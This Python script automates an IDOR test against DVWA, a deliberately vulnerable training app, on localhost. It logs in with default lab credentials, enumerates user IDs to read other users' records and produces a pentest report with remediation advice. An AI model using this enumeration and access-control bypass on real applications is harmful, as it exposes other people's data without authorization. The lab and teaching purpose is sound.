import requests
from bs4 import BeautifulSoup
import datetime
import html

class DVWAIDORTester:
    def __init__(self, base_url="http://localhost/dvwa"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_level = "low"
        self.test_results = []
        self.vulnerable_attempts = []

    def login_as_regular_user(self):
        """Login to DVWA as regular user (gordonb/abc123)"""
        try:
            # Get login page to extract CSRF token
            login_url = f"{self.base_url}/login.php"
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Perform login as regular user
            login_data = {
                'username': 'gordonb',
                'password': 'abc123',
                'Login': 'Login',
                'user_token': user_token
            }
            
            response = self.session.post(login_url, data=login_data)
            
            if "Login failed" in response.text:
                print("[-] Login failed for regular user")
                return False
            
            print("[+] Successfully logged in as regular user (gordonb)")
            return True
            
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return False

    def set_security_level(self):
        """Set DVWA security level to low"""
        try:
            # Get security page to extract CSRF token
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Set security to low
            security_data = {
                'security': self.security_level,
                'seclev_submit': 'Submit',
                'user_token': user_token
            }
            
            response = self.session.post(security_url, data=security_data)
            
            if self.security_level in response.text:
                print(f"[+] Security level set to {self.security_level}")
                return True
            
            print("[-] Failed to set security level")
            return False
            
        except Exception as e:
            print(f"[-] Security level error: {str(e)}")
            return False

    def test_idor_vulnerability(self):
        """Test Insecure Direct Object Reference vulnerability"""
        print("[*] Testing Insecure Direct Object Reference (IDOR) vulnerability...")
        
        # Login as regular user and set security level
        if not self.login_as_regular_user():
            return False
            
        if not self.set_security_level():
            return False
        
        # Access the IDOR vulnerable page
        auth_bypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        
        # Test various user IDs to demonstrate IDOR
        test_user_ids = [
            {"userid": "1", "description": "Admin user", "expected_privilege": "High"},
            {"userid": "2", "description": "Gordon user (own account)", "expected_privilege": "Normal"},
            {"userid": "3", "description": "Hack user", "expected_privilege": "Normal"},
            {"userid": "4", "description": "Pablo user", "expected_privilege": "Normal"},
            {"userid": "5", "description": "Bob user", "expected_privilege": "Normal"},
            {"userid": "999", "description": "Non-existent user", "expected_privilege": "None"}
        ]
        
        for user_test in test_user_ids:
            try:
                userid = user_test['userid']
                description = user_test['description']
                print(f"[*] Testing user ID {userid}: {description}")
                
                # Make request with userid parameter
                response = self.session.get(auth_bypass_url, params={"userid": userid})
                
                # Analyze response for IDOR indicators
                has_user_data = (
                    "user_id" in response.text.lower() or
                    "first name" in response.text.lower() or
                    "surname" in response.text.lower()
                )
                                
                # Check if this represents unauthorized access
                is_unauthorized = False
                if has_user_data:
                    # Accessing other users' data = IDOR vulnerability
                    is_unauthorized = True
                
                result = {
                    'test_type': 'IDOR Test',
                    'userid': userid,
                    'description': description,
                    'expected_privilege': user_test['expected_privilege'],
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'has_user_data': has_user_data,
                    'is_unauthorized': is_unauthorized,
                    'vulnerable': is_unauthorized
                }
                
                self.test_results.append(result)
                
                if is_unauthorized:
                    self.vulnerable_attempts.append(result)
                    print(f"[!] VULNERABLE: Unauthorized access to user ID {userid}")
                elif has_user_data:
                    print(f"[+] Access granted to user ID {userid} (expected behavior)")
                else:
                    print(f"[-] No user data found for user ID {userid}")
                    
            except Exception as e:
                print(f"[-] Error testing user ID {userid}: {str(e)}")
                self.test_results.append({
                    'test_type': 'IDOR Test',
                    'userid': userid,
                    'description': description,
                    'error': str(e),
                    'vulnerable': False
                })

    def test_user_enumeration(self):
        """Test for user enumeration through IDOR"""
        print("[*] Testing user enumeration capabilities...")
        
        auth_bypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        
        # Test sequential user IDs to check for enumeration
        enumeration_test_ids = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
        
        valid_users = []
        invalid_responses = []
        
        for userid in enumeration_test_ids:
            try:
                response = self.session.get(auth_bypass_url, params={"userid": userid})
                
                # Check if this appears to be a valid user
                has_user_indicators = (
                    "User ID" in response.text and
                    "First name" in response.text and
                    "Surname" in response.text and
                    len(response.text) > 200  # Substantial response
                )
                
                if has_user_indicators:
                    valid_users.append(userid)
                    
                result = {
                    'test_type': 'User Enumeration',
                    'userid': userid,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'valid_user_indicators': has_user_indicators,
                    'vulnerable': has_user_indicators
                }
                
                self.test_results.append(result)
                
                if has_user_indicators:
                    print(f"[!] User enumeration: Valid user ID found - {userid}")
                    
            except Exception as e:
                print(f"[-] Error enumerating user ID {userid}: {str(e)}")

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report_filename = f"OSCP_Report_DVWA_IDOR_Localhost_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        # Determine if vulnerable
        vulnerable_count = len([r for r in self.test_results if r.get('vulnerable', False)])
        is_vulnerable = vulnerable_count > 0
            
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - DVWA IDOR</title>
    <style>
        body {{
            font-family: 'Courier New', Courier, monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        h1, h2, h3 {{
            color: #569cd6;
            border-bottom: 2px solid #569cd6;
            padding-bottom: 5px;
        }}
        h1 {{
            text-align: center;
            font-size: 2.5em;
        }}
        .header {{
            background-color: #2d2d30;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }}
        .section {{
            background-color: #2d2d30;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }}
        .code-block {{
            background-color: #1e1e1e;
            border: 1px solid #3c3c3c;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
            margin: 10px 0;
        }}
        .vulnerable {{
            color: #f48771;
            font-weight: bold;
        }}
        .safe {{
            color: #73c991;
            font-weight: bold;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            border: 1px solid #3c3c3c;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background-color: #252526;
            color: #569cd6;
        }}
        tr:nth-child(even) {{
            background-color: #2d2d30;
        }}
        .payload {{
            color: #d7ba7d;
        }}
        .highlight {{
            background-color: #264f78;
            padding: 2px 4px;
            border-radius: 3px;
        }}
        .risk-high {{
            background-color: #3a1a1a;
            border-left: 4px solid #f48771;
            padding: 10px;
            margin: 10px 0;
        }}
        .disclaimer {{
            background-color: #3a3a1a;
            border: 1px solid #d7ba7d;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Penetration Test Report</h1>
            <p><strong>Target:</strong> {self.base_url}/vulnerabilities/authbypass/</p>
            <p><strong>Date:</strong> {timestamp}</p>
            <p><strong>Author:</strong> Automated Security Agent</p>
            <p><strong>Classification:</strong> UNCLASSIFIED</p>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>This penetration test identified critical Insecure Direct Object Reference (IDOR) vulnerabilities in the Damn Vulnerable Web Application (DVWA). Testing was performed by logging in as a regular user (gordonb/abc123) and manipulating the userid parameter to access unauthorized user data.</p>
            
            <div class="disclaimer">
                <strong>Educational Context:</strong> This test was conducted on DVWA, an educational application designed to demonstrate security vulnerabilities. The findings represent legitimate IDOR vulnerabilities but in an educational context.
            </div>
            
            """
        
        if is_vulnerable:
            html_content += """
            <div class="risk-high">
                <strong>Risk Level:</strong> HIGH
            </div>
            <p>Critical Insecure Direct Object Reference (IDOR) vulnerabilities were identified that allow unauthorized access to user data through direct manipulation of object references.</p>
            """
        else:
            html_content += """
            <p><strong class="safe">No IDOR vulnerabilities detected.</strong> The application properly restricts access to user data.</p>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Vulnerability Details</h2>
            <table>
                <tr><th>Category</th><th>Details</th></tr>
                <tr><td><strong>Name</strong></td><td>Insecure Direct Object Reference (IDOR)</td></tr>
                <tr><td><strong>OWASP ID</strong></td><td>OTG-AUTHZ-004</td></tr>
                """
        
        if is_vulnerable:
            html_content += """
                <tr><td><strong>Risk Level</strong></td><td><span class="vulnerable">HIGH</span></td></tr>
                """
        else:
            html_content += """
                <tr><td><strong>Risk Level</strong></td><td><span class="safe">LOW</span></td></tr>
                """
        
        html_content += f"""
                <tr><td><strong>URL</strong></td><td>{self.base_url}/vulnerabilities/authbypass/</td></tr>
                <tr><td><strong>Description</strong></td><td>The application uses direct object references to access user data without proper authorization checks, allowing attackers to manipulate the userid parameter to access unauthorized user information.</td></tr>
                <tr><td><strong>Impact</strong></td><td>User enumeration, unauthorized access to sensitive user data, privilege escalation potential, and violation of data confidentiality.</td></tr>
                <tr><td><strong>Remediation</strong></td><td>Implement proper server-side authorization checks, use indirect object references, validate user permissions, and apply the principle of least privilege.</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>Technical Analysis</h2>
            <h3>Testing Methodology</h3>
            <p>The IDOR testing was conducted by:</p>
            <ol>
                <li>Logging into DVWA as regular user (gordonb/abc123)</li>
                <li>Setting security level to "Low"</li>
                <li>Accessing the Authorization Bypass page with manipulated userid parameters</li>
                <li>Analyzing responses for unauthorized data access</li>
                <li>Testing user enumeration capabilities</li>
            </ol>

            <h3>IDOR Vulnerability Pattern</h3>
            <div class="code-block">
<span class="highlight">Vulnerable Request:</span> GET /dvwa/vulnerabilities/authbypass/?userid=<span class="vulnerable">[USER_ID]</span> HTTP/1.1
<span class="highlight">Issue:</span> No server-side authorization check validates if current user can access requested user data
<span class="highlight">Exploitation:</span> Direct manipulation of userid parameter to access any user's information
            </div>

            <h3>Test Results Summary</h3>
            <table>
                <tr>
                    <th>User ID</th>
                    <th>Description</th>
                    <th>Status Code</th>
                    <th>Has User Data</th>
                    <th>Vulnerable</th>
                </tr>"""
        
        # Add test results to report
        idor_tests = [r for r in self.test_results if r.get('test_type') == 'IDOR Test']
        for result in idor_tests:
            vulnerable_class = "vulnerable" if result.get('vulnerable', False) else "safe"
            vulnerable_text = "YES" if result.get('vulnerable', False) else "NO"
            status_code = result.get('status_code', 'N/A')
            has_data = "Yes" if result.get('has_user_data', False) else "No"
            
            html_content += f"""
                <tr>
                    <td>{html.escape(result.get('userid', 'N/A'))}</td>
                    <td>{html.escape(result.get('description', 'N/A'))}</td>
                    <td>{status_code}</td>
                    <td>{has_data}</td>
                    <td class="{vulnerable_class}">{vulnerable_text}</td>
                </tr>"""
        
        html_content += """
            </table>"""

        # Add proof of concept for vulnerable attempts
        if self.vulnerable_attempts:
            html_content += """
            <h3>Proof of Concept - IDOR Exploitation</h3>
            <p>The following IDOR exploitation attempts were successful:</p>"""
            
            for i, poc in enumerate(self.vulnerable_attempts[:3]):  # Show first 3 PoCs
                html_content += f"""
            <h4>IDOR Exploit {i+1}:</h4>
            <div class="code-block">
<span class="highlight">Attack:</span> Insecure Direct Object Reference (IDOR)
<span class="highlight">Target:</span> {html.escape(poc.get('description', 'N/A'))}
<span class="highlight">Request:</span> GET /dvwa/vulnerabilities/authbypass/?userid={html.escape(poc.get('userid', 'N/A'))} HTTP/1.1
<span class="highlight">Authentication:</span> Regular user session (gordonb/abc123)
<span class="highlight">Status Code:</span> {poc.get('status_code', 'N/A')}
<span class="highlight">Result:</span> Successfully accessed unauthorized user data
<span class="highlight">Vulnerability:</span> Insecure Direct Object Reference (IDOR)
            </div>"""

        html_content += """
        </div>

        <div class="section">
            <h2>Vulnerability Assessment</h2>
            """
        
        if is_vulnerable:
            html_content += """
            <div class="risk-high">
                <h3>Critical Risk Finding</h3>
                <p>Insecure Direct Object Reference (IDOR) vulnerabilities were identified that allow unauthorized access to user data through manipulation of direct object references.</p>
            </div>
            
            <h3>Attack Scenarios</h3>
            <ol>
                <li><strong>User Enumeration:</strong> Discover valid user IDs through systematic testing</li>
                <li><strong>Data Exposure:</strong> Access unauthorized user information including admin accounts</li>
                <li><strong>Privilege Escalation:</strong> Gain insight into administrative accounts and privileges</li>
                <li><strong>Information Gathering:</strong> Collect user data for further attacks</li>
            </ol>
            """
        else:
            html_content += """
            <div class="section">
                <h3>Security Posture</h3>
                <p>The application demonstrates proper access control implementation. No IDOR vulnerabilities were identified.</p>
            </div>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Conclusion</h2>
            """
        
        if is_vulnerable:
            html_content += """
            <p>The testing revealed critical Insecure Direct Object Reference (IDOR) vulnerabilities in DVWA's Authorization Bypass section. The application uses direct object references to access user data without implementing proper server-side authorization checks, allowing any authenticated user to access information belonging to any other user by simply manipulating the userid parameter.</p>
            <p>This represents a fundamental failure in access control implementation and demonstrates the classic IDOR vulnerability pattern where direct manipulation of object identifiers leads to unauthorized data access.</p>
            """
        else:
            html_content += """
            <p>The testing found that the application properly implements access controls and does not exhibit Insecure Direct Object Reference vulnerabilities. Direct object references are properly protected with server-side authorization checks.</p>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Recommendations</h2>
            <ol>
                <li><strong>Implement Server-Side Authorization:</strong> Validate that users can only access data they are authorized to view</li>
                <li><strong>Use Indirect Object References:</strong> Map user-friendly identifiers to internal system identifiers</li>
                <li><strong>Apply Principle of Least Privilege:</strong> Grant users only the minimum required access</li>
                <li><strong>Input Validation:</strong> Validate and sanitize all user-supplied parameters</li>
                <li><strong>Regular Security Testing:</strong> Conduct periodic IDOR vulnerability assessments</li>
            </ol>
        </div>

        <div class="section">
            <h2>Appendices</h2>
            <h3>Tested User IDs</h3>
            <div class="code-block">
?userid=1  # Admin user<br>
?userid=2  # Gordon user (regular)<br>
?userid=3  # Hack user<br>
?userid=4  # Pablo user<br>
?userid=5  # Bob user<br>
?userid=999  # Non-existent user<br>
            </div>
            
            <h3>OWASP IDOR Prevention</h3>
            <ul>
                <li>Use indirect object references (e.g., mapping tables)</li>
                <li>Implement server-side access control checks</li>
                <li>Validate user permissions for each request</li>
                <li>Apply the principle of least privilege</li>
                <li>Use session-based object references where possible</li>
            </ul>
            
            <h3>References</h3>
            <ul>
                <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">OWASP Testing Guide - Insecure Direct Object References (OTG-AUTHZ-004)</a></li>
                <li><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">OWASP Top Ten - Broken Access Control</a></li>
                <li><a href="https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet">OWASP IDOR Prevention Cheat Sheet</a></li>
                <li><a href="https://www.dvwa.co.uk/">DVWA Documentation</a></li>
            </ul>
        </div>
    </div>
</body>
</html>"""

        # Write report to file
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"[+] HTML report generated: {report_filename}")
        return report_filename

    def run_test(self):
        """Run the IDOR test"""
        print("[*] Starting DVWA Insecure Direct Object Reference (IDOR) Test")
        print(f"[*] Target: {self.base_url}/vulnerabilities/authbypass/")
        print("[*] Note: Testing IDOR vulnerability in DVWA's Authorization Bypass section")
        
        # Check if target is reachable
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code != 200:
                print("[-] Target not reachable")
                return False
        except Exception as e:
            print(f"[-] Cannot reach target: {str(e)}")
            return False
        
        # Perform IDOR vulnerability testing
        self.test_idor_vulnerability()
        self.test_user_enumeration()
        
        # Generate report
        report_file = self.generate_html_report()
        
        # Print summary
        vulnerable_count = len([r for r in self.test_results if r.get('vulnerable', False)])
        idor_tests = len([r for r in self.test_results if r.get('test_type') == 'IDOR Test'])
        
        print(f"\n[*] Test Summary:")
        print(f"[*] IDOR tests performed: {idor_tests}")
        print(f"[*] IDOR vulnerabilities found: {vulnerable_count}")
        print(f"[*] Report saved to: {report_file}")
        print("[*] Note: This test demonstrates the legitimate IDOR vulnerability in DVWA")
        
        if vulnerable_count > 0:
            print("[!] CRITICAL: Insecure Direct Object Reference (IDOR) vulnerabilities confirmed!")
            print("[!] Users can access unauthorized data through parameter manipulation!")
        else:
            print("[+] No IDOR vulnerabilities detected.")
        
        return True

if __name__ == "__main__":
    # Create tester instance
    tester = DVWAIDORTester()
    
    # Run the test
    tester.run_test()